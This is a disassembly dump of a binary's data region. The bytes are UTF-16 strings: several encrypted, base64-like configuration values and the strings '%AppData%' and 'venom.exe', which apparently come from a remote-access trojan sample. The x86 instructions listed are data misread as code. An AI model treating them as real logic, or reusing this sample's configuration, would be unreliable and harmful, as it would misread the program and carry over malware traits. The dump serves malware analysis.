  409624:	00 45 00             	add    %al,0x0(%ebp)
  409627:	52                   	push   %edx
  409628:	00 2b                	add    %ch,(%ebx)
  40962a:	00 4f 00             	add    %cl,0x0(%edi)
  40962d:	7a 00                	jp     0x40962f
  40962f:	31 00                	xor    %eax,(%eax)
  409631:	35 00 79 00 7a       	xor    $0x7a007900,%eax
  409636:	00 66 00             	add    %ah,0x0(%esi)
  409639:	75 00                	jne    0x40963b
  40963b:	72 00                	jb     0x40963d
  40963d:	4c                   	dec    %esp
  40963e:	00 43 00             	add    %al,0x0(%ebx)
  409641:	38 00                	cmp    %al,(%eax)
  409643:	2b 00                	sub    (%eax),%eax
  409645:	48                   	dec    %eax
  409646:	00 59 00             	add    %bl,0x0(%ecx)
  409649:	62 00                	bound  %eax,(%eax)
  40964b:	34 00                	xor    $0x0,%al
  40964d:	52                   	push   %edx
  40964e:	00 42 00             	add    %al,0x0(%edx)
  409651:	2b 00                	sub    (%eax),%eax
  409653:	4b                   	dec    %ebx
  409654:	00 69 00             	add    %ch,0x0(%ecx)
  409657:	70 00                	jo     0x409659
  409659:	7a 00                	jp     0x40965b
  40965b:	6b 00 4b             	imul   $0x4b,(%eax),%eax
  40965e:	00 4d 00             	add    %cl,0x0(%ebp)
  409661:	46                   	inc    %esi
  409662:	00 53 00             	add    %dl,0x0(%ebx)
  409665:	4a                   	dec    %edx
  409666:	00 55 00             	add    %dl,0x0(%ebp)
  409669:	50                   	push   %eax
  40966a:	00 57 00             	add    %dl,0x0(%edi)
  40966d:	4a                   	dec    %edx
  40966e:	00 32                	add    %dh,(%edx)
  409670:	00 7a 00             	add    %bh,0x0(%edx)
  409673:	74 00                	je     0x409675
  409675:	32 00                	xor    (%eax),%al
  409677:	33 00                	xor    (%eax),%eax
  409679:	4f                   	dec    %edi
  40967a:	00 52 00             	add    %dl,0x0(%edx)
  40967d:	59                   	pop    %ecx
  40967e:	00 54 00 78          	add    %dl,0x78(%eax,%eax,1)
  409682:	00 2f                	add    %ch,(%edi)
  409684:	00 55 00             	add    %dl,0x0(%ebp)
  409687:	4b                   	dec    %ebx
  409688:	00 4d 00             	add    %cl,0x0(%ebp)
  40968b:	72 00                	jb     0x40968d
  40968d:	78 00                	js     0x40968f
  40968f:	63 00                	arpl   %eax,(%eax)
  409691:	59                   	pop    %ecx
  409692:	00 34 00             	add    %dh,(%eax,%eax,1)
  409695:	30 00                	xor    %al,(%eax)
  409697:	42                   	inc    %edx
  409698:	00 47 00             	add    %al,0x0(%edi)
  40969b:	72 00                	jb     0x40969d
  40969d:	78 00                	js     0x40969f
  40969f:	32 00                	xor    (%eax),%al
  4096a1:	4a                   	dec    %edx
  4096a2:	00 55 00             	add    %dl,0x0(%ebp)
  4096a5:	6c                   	insb   (%dx),%es:(%edi)
  4096a6:	00 49 00             	add    %cl,0x0(%ecx)
  4096a9:	33 00                	xor    (%eax),%eax
  4096ab:	4e                   	dec    %esi
  4096ac:	00 5a 00             	add    %bl,0x0(%edx)
  4096af:	35 00 57 00 6b       	xor    $0x6b005700,%eax
  4096b4:	00 78 00             	add    %bh,0x0(%eax)
  4096b7:	34 00                	xor    $0x0,%al
  4096b9:	56                   	push   %esi
  4096ba:	00 76 00             	add    %dh,0x0(%esi)
  4096bd:	59                   	pop    %ecx
  4096be:	00 66 00             	add    %ah,0x0(%esi)
  4096c1:	44                   	inc    %esp
  4096c2:	00 68 00             	add    %ch,0x0(%eax)
  4096c5:	48                   	dec    %eax
  4096c6:	00 31                	add    %dh,(%ecx)
  4096c8:	00 41 00             	add    %al,0x0(%ecx)
  4096cb:	56                   	push   %esi
  4096cc:	00 78 00             	add    %bh,0x0(%eax)
  4096cf:	71 00                	jno    0x4096d1
  4096d1:	76 00                	jbe    0x4096d3
  4096d3:	43                   	inc    %ebx
  4096d4:	00 44 00 6f          	add    %al,0x6f(%eax,%eax,1)
  4096d8:	00 49 00             	add    %cl,0x0(%ecx)
  4096db:	3d 00 00 80 b1       	cmp    $0xb1800000,%eax
  4096e0:	7a 00                	jp     0x4096e2
  4096e2:	5a                   	pop    %edx
  4096e3:	00 74 00 33          	add    %dh,0x33(%eax,%eax,1)
  4096e7:	00 67 00             	add    %ah,0x0(%edi)
  4096ea:	70 00                	jo     0x4096ec
  4096ec:	2b 00                	sub    (%eax),%eax
  4096ee:	71 00                	jno    0x4096f0
  4096f0:	57                   	push   %edi
  4096f1:	00 46 00             	add    %al,0x0(%esi)
  4096f4:	55                   	push   %ebp
  4096f5:	00 7a 00             	add    %bh,0x0(%edx)
  4096f8:	53                   	push   %ebx
  4096f9:	00 75 00             	add    %dh,0x0(%ebp)
  4096fc:	43                   	inc    %ebx
  4096fd:	00 67 00             	add    %ah,0x0(%edi)
  409700:	37                   	aaa
  409701:	00 65 00             	add    %ah,0x0(%ebp)
  409704:	6e                   	outsb  %ds:(%esi),(%dx)
  409705:	00 77 00             	add    %dh,0x0(%edi)
  409708:	65 00 74 00 61       	add    %dh,%gs:0x61(%eax,%eax,1)
  40970d:	00 41 00             	add    %al,0x0(%ecx)
  409710:	4d                   	dec    %ebp
  409711:	00 5a 00             	add    %bl,0x0(%edx)
  409714:	74 00                	je     0x409716
  409716:	46                   	inc    %esi
  409717:	00 54 00 31          	add    %dl,0x31(%eax,%eax,1)
  40971b:	00 48 00             	add    %cl,0x0(%eax)
  40971e:	4c                   	dec    %esp
  40971f:	00 66 00             	add    %ah,0x0(%esi)
  409722:	47                   	inc    %edi
  409723:	00 32                	add    %dh,(%edx)
  409725:	00 4f 00             	add    %cl,0x0(%edi)
  409728:	41                   	inc    %ecx
  409729:	00 4f 00             	add    %cl,0x0(%edi)
  40972c:	45                   	inc    %ebp
  40972d:	00 30                	add    %dh,(%eax)
  40972f:	00 67 00             	add    %ah,0x0(%edi)
  409732:	6d                   	insl   (%dx),%es:(%edi)
  409733:	00 36                	add    %dh,(%esi)
  409735:	00 4a 00             	add    %cl,0x0(%edx)
  409738:	7a 00                	jp     0x40973a
  40973a:	6d                   	insl   (%dx),%es:(%edi)
  40973b:	00 41 00             	add    %al,0x0(%ecx)
  40973e:	77 00                	ja     0x409740
  409740:	55                   	push   %ebp
  409741:	00 70 00             	add    %dh,0x0(%eax)
  409744:	45                   	inc    %ebp
  409745:	00 65 00             	add    %ah,0x0(%ebp)
  409748:	42                   	inc    %edx
  409749:	00 58 00             	add    %bl,0x0(%eax)
  40974c:	31 00                	xor    %eax,(%eax)
  40974e:	34 00                	xor    $0x0,%al
  409750:	30 00                	xor    %al,(%eax)
  409752:	38 00                	cmp    %al,(%eax)
  409754:	78 00                	js     0x409756
  409756:	6b 00 71             	imul   $0x71,(%eax),%eax
  409759:	00 54 00 6b          	add    %dl,0x6b(%eax,%eax,1)
  40975d:	00 35 00 31 00 32    	add    %dh,0x32003100
  409763:	00 38                	add    %bh,(%eax)
  409765:	00 67 00             	add    %ah,0x0(%edi)
  409768:	78 00                	js     0x40976a
  40976a:	34 00                	xor    $0x0,%al
  40976c:	69 00 47 00 78 00    	imul   $0x780047,(%eax),%eax
  409772:	65 00 66 00          	add    %ah,%gs:0x0(%esi)
  409776:	43                   	inc    %ebx
  409777:	00 75 00             	add    %dh,0x0(%ebp)
  40977a:	38 00                	cmp    %al,(%eax)
  40977c:	4a                   	dec    %edx
  40977d:	00 30                	add    %dh,(%eax)
  40977f:	00 4e 00             	add    %cl,0x0(%esi)
  409782:	39 00                	cmp    %eax,(%eax)
  409784:	76 00                	jbe    0x409786
  409786:	37                   	aaa
  409787:	00 6d 00             	add    %ch,0x0(%ebp)
  40978a:	67 00 3d             	add    %bh,(%di)
  40978d:	00 3d 00 00 80 b1    	add    %bh,0xb1800000
  409793:	57                   	push   %edi
  409794:	00 6b 00             	add    %ch,0x0(%ebx)
  409797:	2f                   	das
  409798:	00 6b 00             	add    %ch,0x0(%ebx)
  40979b:	30 00                	xor    %al,(%eax)
  40979d:	76 00                	jbe    0x40979f
  40979f:	39 00                	cmp    %eax,(%eax)
  4097a1:	73 00                	jae    0x4097a3
  4097a3:	50                   	push   %eax
  4097a4:	00 4b 00             	add    %cl,0x0(%ebx)
  4097a7:	58                   	pop    %eax
  4097a8:	00 4b 00             	add    %cl,0x0(%ebx)
  4097ab:	54                   	push   %esp
  4097ac:	00 66 00             	add    %ah,0x0(%esi)
  4097af:	51                   	push   %ecx
  4097b0:	00 47 00             	add    %al,0x0(%edi)
  4097b3:	59                   	pop    %ecx
  4097b4:	00 52 00             	add    %dl,0x0(%edx)
  4097b7:	70 00                	jo     0x4097b9
  4097b9:	55                   	push   %ebp
  4097ba:	00 2b                	add    %ch,(%ebx)
  4097bc:	00 36                	add    %dh,(%esi)
  4097be:	00 4a 00             	add    %cl,0x0(%edx)
  4097c1:	33 00                	xor    (%eax),%eax
  4097c3:	53                   	push   %ebx
  4097c4:	00 35 00 4e 00 6e    	add    %dh,0x6e004e00
  4097ca:	00 61 00             	add    %ah,0x0(%ecx)
  4097cd:	38 00                	cmp    %al,(%eax)
  4097cf:	64 00 38             	add    %bh,%fs:(%eax)
  4097d2:	00 66 00             	add    %ah,0x0(%esi)
  4097d5:	68 00 7a 00 45       	push   $0x45007a00
  4097da:	00 61 00             	add    %ah,0x0(%ecx)
  4097dd:	63 00                	arpl   %eax,(%eax)
  4097df:	47                   	inc    %edi
  4097e0:	00 2b                	add    %ch,(%ebx)
  4097e2:	00 78 00             	add    %bh,0x0(%eax)
  4097e5:	64 00 33             	add    %dh,%fs:(%ebx)
  4097e8:	00 72 00             	add    %dh,0x0(%edx)
  4097eb:	4d                   	dec    %ebp
  4097ec:	00 66 00             	add    %ah,0x0(%esi)
  4097ef:	48                   	dec    %eax
  4097f0:	00 58 00             	add    %bl,0x0(%eax)
  4097f3:	37                   	aaa
  4097f4:	00 71 00             	add    %dh,0x0(%ecx)
  4097f7:	38 00                	cmp    %al,(%eax)
  4097f9:	55                   	push   %ebp
  4097fa:	00 6a 00             	add    %ch,0x0(%edx)
  4097fd:	41                   	inc    %ecx
  4097fe:	00 4d 00             	add    %cl,0x0(%ebp)
  409801:	4c                   	dec    %esp
  409802:	00 54 00 51          	add    %dl,0x51(%eax,%eax,1)
  409806:	00 5a 00             	add    %bl,0x0(%edx)
  409809:	47                   	inc    %edi
  40980a:	00 50 00             	add    %dl,0x0(%eax)
  40980d:	66 00 47 00          	data16 add %al,0x0(%edi)
  409811:	31 00                	xor    %eax,(%eax)
  409813:	56                   	push   %esi
  409814:	00 4e 00             	add    %cl,0x0(%esi)
  409817:	57                   	push   %edi
  409818:	00 69 00             	add    %ch,0x0(%ecx)
  40981b:	78 00                	js     0x40981d
  40981d:	41                   	inc    %ecx
  40981e:	00 36                	add    %dh,(%esi)
  409820:	00 70 00             	add    %dh,0x0(%eax)
  409823:	68 00 6c 00 63       	push   $0x63006c00
  409828:	00 74 00 47          	add    %dh,0x47(%eax,%eax,1)
  40982c:	00 34 00             	add    %dh,(%eax,%eax,1)
  40982f:	77 00                	ja     0x409831
  409831:	57                   	push   %edi
  409832:	00 34 00             	add    %dh,(%eax,%eax,1)
  409835:	71 00                	jno    0x409837
  409837:	33 00                	xor    (%eax),%eax
  409839:	62 00                	bound  %eax,(%eax)
  40983b:	6c                   	insb   (%dx),%es:(%edi)
  40983c:	00 77 00             	add    %dh,0x0(%edi)
  40983f:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  409844:	80 b1 38 00 6c 00 65 	xorb   $0x65,0x6c0038(%ecx)
  40984b:	00 79 00             	add    %bh,0x0(%ecx)
  40984e:	49                   	dec    %ecx
  40984f:	00 31                	add    %dh,(%ecx)
  409851:	00 61 00             	add    %ah,0x0(%ecx)
  409854:	36 00 76 00          	add    %dh,%ss:0x0(%esi)
  409858:	74 00                	je     0x40985a
  40985a:	55                   	push   %ebp
  40985b:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40985f:	00 52 00             	add    %dl,0x0(%edx)
  409862:	77 00                	ja     0x409864
  409864:	31 00                	xor    %eax,(%eax)
  409866:	4b                   	dec    %ebx
  409867:	00 53 00             	add    %dl,0x0(%ebx)
  40986a:	63 00                	arpl   %eax,(%eax)
  40986c:	79 00                	jns    0x40986e
  40986e:	37                   	aaa
  40986f:	00 39                	add    %bh,(%ecx)
  409871:	00 4d 00             	add    %cl,0x0(%ebp)
  409874:	42                   	inc    %edx
  409875:	00 64 00 48          	add    %ah,0x48(%eax,%eax,1)
  409879:	00 46 00             	add    %al,0x0(%esi)
  40987c:	69 00 4c 00 76 00    	imul   $0x76004c,(%eax),%eax
  409882:	46                   	inc    %esi
  409883:	00 6b 00             	add    %ch,0x0(%ebx)
  409886:	51                   	push   %ecx
  409887:	00 4f 00             	add    %cl,0x0(%edi)
  40988a:	72 00                	jb     0x40988c
  40988c:	4f                   	dec    %edi
  40988d:	00 51 00             	add    %dl,0x0(%ecx)
  409890:	44                   	inc    %esp
  409891:	00 4d 00             	add    %cl,0x0(%ebp)
  409894:	66 00 78 00          	data16 add %bh,0x0(%eax)
  409898:	61                   	popa
  409899:	00 32                	add    %dh,(%edx)
  40989b:	00 51 00             	add    %dl,0x0(%ecx)
  40989e:	53                   	push   %ebx
  40989f:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  4098a3:	00 78 00             	add    %bh,0x0(%eax)
  4098a6:	44                   	inc    %esp
  4098a7:	00 35 00 4c 00 48    	add    %dh,0x48004c00
  4098ad:	00 4a 00             	add    %cl,0x0(%edx)
  4098b0:	4f                   	dec    %edi
  4098b1:	00 4c 00 70          	add    %cl,0x70(%eax,%eax,1)
  4098b5:	00 38                	add    %bh,(%eax)
  4098b7:	00 4b 00             	add    %cl,0x0(%ebx)
  4098ba:	52                   	push   %edx
  4098bb:	00 31                	add    %dh,(%ecx)
  4098bd:	00 34 00             	add    %dh,(%eax,%eax,1)
  4098c0:	74 00                	je     0x4098c2
  4098c2:	75 00                	jne    0x4098c4
  4098c4:	75 00                	jne    0x4098c6
  4098c6:	43                   	inc    %ebx
  4098c7:	00 48 00             	add    %cl,0x0(%eax)
  4098ca:	74 00                	je     0x4098cc
  4098cc:	6b 00 48             	imul   $0x48,(%eax),%eax
  4098cf:	00 6b 00             	add    %ch,0x0(%ebx)
  4098d2:	31 00                	xor    %eax,(%eax)
  4098d4:	4e                   	dec    %esi
  4098d5:	00 6a 00             	add    %ch,0x0(%edx)
  4098d8:	49                   	dec    %ecx
  4098d9:	00 35 00 30 00 38    	add    %dh,0x38003000
  4098df:	00 4b 00             	add    %cl,0x0(%ebx)
  4098e2:	52                   	push   %edx
  4098e3:	00 59 00             	add    %bl,0x0(%ecx)
  4098e6:	32 00                	xor    (%eax),%al
  4098e8:	63 00                	arpl   %eax,(%eax)
  4098ea:	6b 00 6b             	imul   $0x6b,(%eax),%eax
  4098ed:	00 6e 00             	add    %ch,0x0(%esi)
  4098f0:	51                   	push   %ecx
  4098f1:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  4098f7:	13 25 00 41 00 70    	adc    0x70004100,%esp
  4098fd:	00 70 00             	add    %dh,0x0(%eax)
  409900:	44                   	inc    %esp
  409901:	00 61 00             	add    %ah,0x0(%ecx)
  409904:	74 00                	je     0x409906
  409906:	61                   	popa
  409907:	00 25 00 00 13 76    	add    %ah,0x76130000
  40990d:	00 65 00             	add    %ah,0x0(%ebp)
  409910:	6e                   	outsb  %ds:(%esi),(%dx)
  409911:	00 6f 00             	add    %ch,0x0(%edi)
  409914:	6d                   	insl   (%dx),%es:(%edi)
  409915:	00 2e                	add    %ch,(%esi)
  409917:	00 65 00             	add    %ah,0x0(%ebp)
  40991a:	78 00                	js     0x40991c
  40991c:	65 00 00             	add    %al,%gs:(%eax)
  40991f:	59                   	pop    %ecx
  409920:	59                   	pop    %ecx
  409921:	00 6b 00             	add    %ch,0x0(%ebx)
  409924:	52                   	push   %edx
  409925:	00 49 00             	add    %cl,0x0(%ecx)
  409928:	51                   	push   %ecx
  409929:	00 55 00             	add    %dl,0x0(%ebp)
  40992c:	55                   	push   %ebp
  40992d:	00 35 00 65 00 55    	add    %dh,0x55006500
  409933:	00 56 00             	add    %dl,0x0(%esi)
  409936:	72 00                	jb     0x409938
  409938:	55                   	push   %ebp
  409939:	00 56 00             	add    %dl,0x0(%esi)
  40993c:	51                   	push   %ecx
  40993d:	00 32                	add    %dh,(%edx)
  40993f:	00 53 00             	add    %dl,0x0(%ebx)
  409942:	54                   	push   %esp
  409943:	00 68 00             	add    %ch,0x0(%eax)
  409946:	77 00                	ja     0x409948
  409948:	4d                   	dec    %ebp
  409949:	00 6d 00             	add    %ch,0x0(%ebp)
  40994c:	68 00 50 00 63       	push   $0x63005000
  409951:	00 55 00             	add    %dl,0x0(%ebp)
  409954:	46                   	inc    %esi
  409955:	00 45 00             	add    %al,0x0(%ebp)
  409958:	65 00 58 00          	add    %bl,%gs:0x0(%eax)
  40995c:	46                   	inc    %esi
  40995d:	00 77 00             	add    %dh,0x0(%edi)
  409960:	53                   	push   %ebx
  409961:	00 47 00             	add    %al,0x0(%edi)
  409964:	63 00                	arpl   %eax,(%eax)
  409966:	33 00                	xor    (%eax),%eax
  409968:	52                   	push   %edx
  409969:	00 48 00             	add    %cl,0x0(%eax)
  40996c:	56                   	push   %esi
  40996d:	00 6f 00             	add    %ch,0x0(%edi)
  409970:	62 00                	bound  %eax,(%eax)
  409972:	7a 00                	jp     0x409974
  409974:	4d                   	dec    %ebp
  409975:	00 3d 00 00 80 d9    	add    %bh,0xd9800000
  40997b:	4d                   	dec    %ebp
  40997c:	00 35 00 34 00 74    	add    %dh,0x74003400
  409982:	00 6b 00             	add    %ch,0x0(%ebx)
  409985:	30 00                	xor    %al,(%eax)
  409987:	4f                   	dec    %edi
  409988:	00 67 00             	add    %ah,0x0(%edi)
  40998b:	52                   	push   %edx
  40998c:	00 4b 00             	add    %cl,0x0(%ebx)
  40998f:	76 00                	jbe    0x409991
  409991:	6e                   	outsb  %ds:(%esi),(%dx)
  409992:	00 50 00             	add    %dl,0x0(%eax)
  409995:	53                   	push   %ebx
  409996:	00 53 00             	add    %dl,0x0(%ebx)
  409999:	2f                   	das
  40999a:	00 66 00             	add    %ah,0x0(%esi)
  40999d:	2b 00                	sub    (%eax),%eax
  40999f:	71 00                	jno    0x4099a1
  4099a1:	56                   	push   %esi
  4099a2:	00 2f                	add    %ch,(%edi)
  4099a4:	00 6b 00             	add    %ch,0x0(%ebx)
  4099a7:	57                   	push   %edi
  4099a8:	00 64 00 6e          	add    %ah,0x6e(%eax,%eax,1)
  4099ac:	00 62 00             	add    %ah,0x0(%edx)
  4099af:	73 00                	jae    0x4099b1
  4099b1:	6c                   	insb   (%dx),%es:(%edi)
  4099b2:	00 77 00             	add    %dh,0x0(%edi)
  4099b5:	4c                   	dec    %esp
  4099b6:	00 64 00 54          	add    %ah,0x54(%eax,%eax,1)
  4099ba:	00 65 00             	add    %ah,0x0(%ebp)
  4099bd:	42                   	inc    %edx
  4099be:	00 36                	add    %dh,(%esi)
  4099c0:	00 69 00             	add    %ch,0x0(%ecx)
  4099c3:	65 00 66 00          	add    %ah,%gs:0x0(%esi)
  4099c7:	49                   	dec    %ecx
  4099c8:	00 6a 00             	add    %ch,0x0(%edx)
  4099cb:	79 00                	jns    0x4099cd
  4099cd:	47                   	inc    %edi
  4099ce:	00 71 00             	add    %dh,0x0(%ecx)
  4099d1:	41                   	inc    %ecx
  4099d2:	00 75 00             	add    %dh,0x0(%ebp)
  4099d5:	48                   	dec    %eax
  4099d6:	00 43 00             	add    %al,0x0(%ebx)
  4099d9:	38 00                	cmp    %al,(%eax)
  4099db:	4a                   	dec    %edx
  4099dc:	00 61 00             	add    %ah,0x0(%ecx)
  4099df:	68 00 47 00 70       	push   $0x70004700
  4099e4:	00 44 00 35          	add    %al,0x35(%eax,%eax,1)
  4099e8:	00 30                	add    %dh,(%eax)
  4099ea:	00 36                	add    %dh,(%esi)
  4099ec:	00 50 00             	add    %dl,0x0(%eax)
  4099ef:	38 00                	cmp    %al,(%eax)
  4099f1:	46                   	inc    %esi
  4099f2:	00 4e 00             	add    %cl,0x0(%esi)
  4099f5:	77 00                	ja     0x4099f7
  4099f7:	65 00 47 00          	add    %al,%gs:0x0(%edi)
  4099fb:	61                   	popa
  4099fc:	00 41 00             	add    %al,0x0(%ecx)
  4099ff:	32 00                	xor    (%eax),%al
  409a01:	55                   	push   %ebp
  409a02:	00 42 00             	add    %al,0x0(%edx)
  409a05:	62 00                	bound  %eax,(%eax)
  409a07:	35 00 57 00 34       	xor    $0x34005700,%eax
  409a0c:	00 49 00             	add    %cl,0x0(%ecx)
  409a0f:	75 00                	jne    0x409a11
  409a11:	78 00                	js     0x409a13
  409a13:	6e                   	outsb  %ds:(%esi),(%dx)
  409a14:	00 31                	add    %dh,(%ecx)
  409a16:	00 33                	add    %dh,(%ebx)
  409a18:	00 45 00             	add    %al,0x0(%ebp)
  409a1b:	4e                   	dec    %esi
  409a1c:	00 56 00             	add    %dl,0x0(%esi)
  409a1f:	41                   	inc    %ecx
  409a20:	00 2f                	add    %ch,(%edi)
  409a22:	00 79 00             	add    %bh,0x0(%ecx)
  409a25:	6a 00                	push   $0x0
  409a27:	54                   	push   %esp
  409a28:	00 35 00 69 00 6b    	add    %dh,0x6b006900
  409a2e:	00 79 00             	add    %bh,0x0(%ecx)
  409a31:	55                   	push   %ebp
  409a32:	00 43 00             	add    %al,0x0(%ebx)
  409a35:	72 00                	jb     0x409a37
  409a37:	45                   	inc    %ebp
  409a38:	00 42 00             	add    %al,0x0(%edx)
  409a3b:	63 00                	arpl   %eax,(%eax)
  409a3d:	47                   	inc    %edi
  409a3e:	00 54 00 5a          	add    %dl,0x5a(%eax,%eax,1)
  409a42:	00 6a 00             	add    %ch,0x0(%edx)
  409a45:	75 00                	jne    0x409a47
  409a47:	71 00                	jno    0x409a49
  409a49:	30 00                	xor    %al,(%eax)
  409a4b:	42                   	inc    %edx
  409a4c:	00 38                	add    %bh,(%eax)
  409a4e:	00 6f 00             	add    %ch,0x0(%edi)
  409a51:	3d 00 00 92 59       	cmp    $0x59920000,%eax
  409a56:	6c                   	insb   (%dx),%es:(%edi)
  409a57:	00 50 00             	add    %dl,0x0(%eax)
  409a5a:	4b                   	dec    %ebx
  409a5b:	00 4c 00 38          	add    %cl,0x38(%eax,%eax,1)
  409a5f:	00 5a 00             	add    %bl,0x0(%edx)
  409a62:	65 00 41 00          	add    %al,%gs:0x0(%ecx)
  409a66:	74 00                	je     0x409a68
  409a68:	50                   	push   %eax
  409a69:	00 73 00             	add    %dh,0x0(%ebx)
  409a6c:	78 00                	js     0x409a6e
  409a6e:	5a                   	pop    %edx
  409a6f:	00 72 00             	add    %dh,0x0(%edx)
  409a72:	74 00                	je     0x409a74
  409a74:	68 00 49 00 49       	push   $0x49004900
  409a79:	00 39                	add    %bh,(%ecx)
  409a7b:	00 2b                	add    %ch,(%ebx)
  409a7d:	00 50 00             	add    %dl,0x0(%eax)
  409a80:	71 00                	jno    0x409a82
  409a82:	50                   	push   %eax
  409a83:	00 46 00             	add    %al,0x0(%esi)
  409a86:	32 00                	xor    (%eax),%al
  409a88:	47                   	inc    %edi
  409a89:	00 48 00             	add    %cl,0x0(%eax)
  409a8c:	53                   	push   %ebx
  409a8d:	00 73 00             	add    %dh,0x0(%ebx)
  409a90:	2b 00                	sub    (%eax),%eax
  409a92:	57                   	push   %edi
  409a93:	00 66 00             	add    %ah,0x0(%esi)
  409a96:	51                   	push   %ecx
  409a97:	00 59 00             	add    %bl,0x0(%ecx)
  409a9a:	5a                   	pop    %edx
  409a9b:	00 68 00             	add    %ch,0x0(%eax)
  409a9e:	6b 00 6c             	imul   $0x6c,(%eax),%eax
  409aa1:	00 74 00 51          	add    %dh,0x51(%eax,%eax,1)
  409aa5:	00 75 00             	add    %dh,0x0(%ebp)
  409aa8:	62 00                	bound  %eax,(%eax)
  409aaa:	41                   	inc    %ecx
  409aab:	00 52 00             	add    %dl,0x0(%edx)
  409aae:	43                   	inc    %ebx
  409aaf:	00 41 00             	add    %al,0x0(%ecx)
  409ab2:	7a 00                	jp     0x409ab4
  409ab4:	55                   	push   %ebp
  409ab5:	00 79 00             	add    %bh,0x0(%ecx)
  409ab8:	6a 00                	push   $0x0
  409aba:	5a                   	pop    %edx
  409abb:	00 68 00             	add    %ch,0x0(%eax)
  409abe:	38 00                	cmp    %al,(%eax)
  409ac0:	75 00                	jne    0x409ac2
  409ac2:	48                   	dec    %eax
  409ac3:	00 77 00             	add    %dh,0x0(%edi)
  409ac6:	37                   	aaa
  409ac7:	00 7a 00             	add    %bh,0x0(%edx)
  409aca:	37                   	aaa
  409acb:	00 30                	add    %dh,(%eax)
  409acd:	00 55 00             	add    %dl,0x0(%ebp)
  409ad0:	63 00                	arpl   %eax,(%eax)
  409ad2:	62 00                	bound  %eax,(%eax)
  409ad4:	6d                   	insl   (%dx),%es:(%edi)
  409ad5:	00 38                	add    %bh,(%eax)
  409ad7:	00 78 00             	add    %bh,0x0(%eax)
  409ada:	4b                   	dec    %ebx
  409adb:	00 47 00             	add    %al,0x0(%edi)
  409ade:	74 00                	je     0x409ae0
  409ae0:	4d                   	dec    %ebp
  409ae1:	00 43 00             	add    %al,0x0(%ebx)
  409ae4:	50                   	push   %eax
  409ae5:	00 56 00             	add    %dl,0x0(%esi)
  409ae8:	43                   	inc    %ebx
  409ae9:	00 56 00             	add    %dl,0x0(%esi)
  409aec:	34 00                	xor    $0x0,%al
  409aee:	34 00                	xor    $0x0,%al
  409af0:	69 00 54 00 70 00    	imul   $0x700054,(%eax),%eax
  409af6:	58                   	pop    %eax
  409af7:	00 44 00 30          	add    %al,0x30(%eax,%eax,1)
  409afb:	00 78 00             	add    %bh,0x0(%eax)
  409afe:	52                   	push   %edx
  409aff:	00 35 00 56 00 2b    	add    %dh,0x2b005600
  409b05:	00 67 00             	add    %ah,0x0(%edi)
  409b08:	49                   	dec    %ecx
  409b09:	00 74 00 35          	add    %dh,0x35(%eax,%eax,1)
  409b0d:	00 4b 00             	add    %cl,0x0(%ebx)
  409b10:	4b                   	dec    %ebx
  409b11:	00 30                	add    %dh,(%eax)
  409b13:	00 56 00             	add    %dl,0x0(%esi)
  409b16:	71 00                	jno    0x409b18
  409b18:	44                   	inc    %esp
  409b19:	00 32                	add    %dh,(%edx)
  409b1b:	00 70 00             	add    %dh,0x0(%eax)
  409b1e:	4a                   	dec    %edx
  409b1f:	00 6a 00             	add    %ch,0x0(%edx)
  409b22:	35 00 4f 00 61       	xor    $0x61004f00,%eax
  409b27:	00 32                	add    %dh,(%edx)
  409b29:	00 47 00             	add    %al,0x0(%edi)
  409b2c:	32 00                	xor    (%eax),%al
  409b2e:	6a 00                	push   $0x0
  409b30:	39 00                	cmp    %eax,(%eax)
  409b32:	6a 00                	push   $0x0
  409b34:	4a                   	dec    %edx
  409b35:	00 77 00             	add    %dh,0x0(%edi)
  409b38:	48                   	dec    %eax
  409b39:	00 6e 00             	add    %ch,0x0(%esi)
  409b3c:	67 00 63 00          	add    %ah,0x0(%bp,%di)
  409b40:	64 00 2f             	add    %ch,%fs:(%edi)
  409b43:	00 37                	add    %dh,(%edi)
  409b45:	00 6a 00             	add    %ch,0x0(%edx)
  409b48:	52                   	push   %edx
  409b49:	00 39                	add    %bh,(%ecx)
  409b4b:	00 52 00             	add    %dl,0x0(%edx)
  409b4e:	73 00                	jae    0x409b50
  409b50:	39 00                	cmp    %eax,(%eax)
  409b52:	51                   	push   %ecx
  409b53:	00 51 00             	add    %dl,0x0(%ecx)
  409b56:	70 00                	jo     0x409b58
  409b58:	69 00 38 00 45 00    	imul   $0x450038,(%eax),%eax
  409b5e:	67 00 6e 00          	add    %ch,0x0(%bp)
  409b62:	65 00 68 00          	add    %ch,%gs:0x0(%eax)
  409b66:	43                   	inc    %ebx
  409b67:	00 63 00             	add    %ah,0x0(%ebx)
  409b6a:	30 00                	xor    %al,(%eax)
  409b6c:	33 00                	xor    (%eax),%eax
  409b6e:	2f                   	das
  409b6f:	00 49 00             	add    %cl,0x0(%ecx)
  409b72:	47                   	inc    %edi
  409b73:	00 4a 00             	add    %cl,0x0(%edx)
  409b76:	66 00 43 00          	data16 add %al,0x0(%ebx)
  409b7a:	6f                   	outsl  %ds:(%esi),(%dx)
  409b7b:	00 34 00             	add    %dh,(%eax,%eax,1)
  409b7e:	75 00                	jne    0x409b80
  409b80:	4a                   	dec    %edx
  409b81:	00 64 00 33          	add    %ah,0x33(%eax,%eax,1)
  409b85:	00 6f 00             	add    %ch,0x0(%edi)
  409b88:	55                   	push   %ebp
  409b89:	00 2f                	add    %ch,(%edi)
  409b8b:	00 4e 00             	add    %cl,0x0(%esi)
  409b8e:	59                   	pop    %ecx
  409b8f:	00 52 00             	add    %dl,0x0(%edx)
  409b92:	54                   	push   %esp
  409b93:	00 43 00             	add    %al,0x0(%ebx)
  409b96:	52                   	push   %edx
  409b97:	00 69 00             	add    %ch,0x0(%ecx)
  409b9a:	4c                   	dec    %esp
  409b9b:	00 66 00             	add    %ah,0x0(%esi)
  409b9e:	48                   	dec    %eax
  409b9f:	00 63 00             	add    %ah,0x0(%ebx)
  409ba2:	51                   	push   %ecx
  409ba3:	00 41 00             	add    %al,0x0(%ecx)
  409ba6:	6e                   	outsb  %ds:(%esi),(%dx)
  409ba7:	00 79 00             	add    %bh,0x0(%ecx)
  409baa:	2b 00                	sub    (%eax),%eax
  409bac:	37                   	aaa
  409bad:	00 63 00             	add    %ah,0x0(%ebx)
  409bb0:	34 00                	xor    $0x0,%al
  409bb2:	30 00                	xor    %al,(%eax)
  409bb4:	49                   	dec    %ecx
  409bb5:	00 42 00             	add    %al,0x0(%edx)
  409bb8:	42                   	inc    %edx
